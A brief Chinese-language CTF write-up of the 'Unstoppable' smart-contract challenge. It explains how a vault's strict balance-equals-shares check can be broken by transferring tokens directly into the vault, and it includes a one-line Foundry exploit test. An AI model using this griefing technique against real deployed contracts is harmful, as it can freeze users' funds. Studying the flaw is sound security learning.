# 8.29

# Unstoppable

这里比较了质押的assets和整个合约的余额，如果不相同则会revert

这里合约编写着忽略了合约资产的来源不仅仅是来自于质押，也可以来自于外部转账

```solidity
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

所以只需要不走质押，直接转账给这个合约就可以触发这个revert，也可以写一个自毁合约来强制转账给金库合约

所以我们不应该用合约账户的余额来作为合约一部分。。

exp

```solidity
    function test_unstoppable() public checkSolvedByPlayer {
         token.transfer( address(vault), token.balanceOf(player));
    }
```

通过了测试